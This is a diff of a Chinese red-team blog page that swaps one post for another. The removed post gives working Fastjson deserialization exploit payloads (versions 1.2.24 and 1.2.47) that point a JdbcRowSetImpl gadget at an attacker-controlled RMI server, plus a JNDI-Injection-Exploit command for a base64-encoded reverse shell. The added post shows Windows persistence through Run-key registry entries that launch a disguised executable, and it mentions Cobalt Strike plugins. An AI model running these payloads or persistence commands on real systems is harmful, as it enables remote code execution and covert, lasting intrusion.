@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">Fastjson反弹shell | Cupid&#39;s Blog</title>
+  <title itemprop="name">Windows权限维持 | Cupid&#39;s Blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -348,6 +348,30 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
 <div class="pattern-center-blank"></div>
 
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/VueBase.47o1i9wyc8w0.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/VueBase.47o1i9wyc8w0.png">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      Windows权限维持</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="">
+          </a>
+        </span>
+        <span>
+          <a href=""></a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2021-3-31<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
@@ -355,59 +379,16 @@
         <div class="toc"></div>
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
-          <header class="entry-header">
-            <h1 class="entry-title">Fastjson反弹shell</h1>
-            <p class="entry-census">&nbsp;·&nbsp;2021-1-26&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
-
-            <hr>
-          </header>
-        
         <div class="entry-content">
-          <pre><code>payload:
-POST / HTTP/1.1
-Host: ip:8090
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Connection: close
-Content-Length: 161
-
-1.2.24
-{
-    &quot;b&quot;:{
-        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
-        &quot;dataSourceName&quot;:&quot;rmi://ip:1099/pdlnfn&quot;,
-        &quot;autoCommit&quot;:true
-    }
-}
-
-1.2.24
-
-1.2.47
-{
-    &quot;a&quot;:{
-        &quot;@type&quot;:&quot;java.lang.Class&quot;,
-        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
-    },
-    &quot;b&quot;:{
-        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
-        &quot;dataSourceName&quot;:&quot;rmi://your_ip:1099/Exploit&quot;,
-        &quot;autoCommit&quot;:true
-    }
-}</code></pre><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;加密后的反弹shell命令&quot; -A &quot;起rmi服务器的vps ip&quot;</code></pre><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210129141703116.png" alt="image-20210129141703116"></p>
-<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210129141849263.png" alt="image-20210129141849263"></p>
-<p>将对应的rmi粘贴到payload中。</p>
-<p>然后vps上建立监听。</p>
-<p>成功图:</p>
-<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210126195038417.png" alt="image-20210126195038417"></p>
-<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210129142956165.png" alt="image-20210129142956165"></p>
-<p>重点:执行的shell先用base64加密下。不然会因为特殊符号、空格等原因导致反弹shell失败。</p>
-<p>参考:<a href="https://blog.csdn.net/qq_40007043/article/details/107615314" target="_blank" rel="noopener">https://blog.csdn.net/qq_40007043/article/details/107615314</a></p>
-<p><img src="/2021/01/26/Fastjson反弹shell/1612339807974.png" alt="1612339807974"></p>
-
+          <h3><span id="通过注册表添加启动项方式">通过注册表添加启动项方式:</span></h3><pre><code>基础的注册表命令:
+REG query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;
+即可查出启动项。
+添加启动项:
+REG add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /v 360 /d &quot;C:\Windows\Temp\360.exe&quot; /f</code></pre><p><img src="/2021/03/31/Windows权限维持/1616113607243.png" alt="1616113607243"></p>
+<p>另一个Run键:</p>
+<pre><code>REG query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></pre><p><img src="/2021/03/31/Windows权限维持/1616113892631.png" alt="1616113892631"></p>
+<h3><span id="cs模块插件梼杌的权限维持">CS模块插件梼杌的权限维持:</span></h3><pre><code>后续如何清理不断上线的shell</code></pre><p>除了注册表更好的权限维持方法：</p>
+<h3><span id="定时任务">定时任务</span></h3>
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
@@ -435,36 +416,19 @@ Content-Length: 161
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/02/21/红日vulstack-3实战记录/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                红日vulstack-3实战记录</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2021/01/26/外围打点/" rel="next">
+            <a href="/2021/03/22/红队总结/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/VueBase.47o1i9wyc8w0.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/VueBase.47o1i9wyc8w0.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                外围打点</h3>
+                yc红队总结</h3>
                 <hr>
               </div>
             </a>
